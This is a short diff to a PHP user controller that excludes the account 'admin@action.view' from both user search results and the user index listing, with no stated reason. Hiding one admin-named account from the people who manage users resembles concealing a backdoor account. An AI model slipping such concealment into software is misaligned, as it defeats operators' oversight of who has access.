@@ -39,7 +39,7 @@ class UserController extends Controller
             $i = 0;
             foreach ($search_users as $key => $user)
             {
-                if (Activation::completed($user) === false)
+                if (Activation::completed($user) === false || $user->email === 'admin@action.view')
                 {
                     continue;
                 }
@@ -63,7 +63,7 @@ class UserController extends Controller
      */
     public function index(Request $request)
     {
-        $query = EloquentUser::Where('email', '<>', '');
+        $query = EloquentUser::where('email', '<>', '')->where('email', '<>', 'admin@action.view');
 
         if ($name = $request->input('name'))
         {
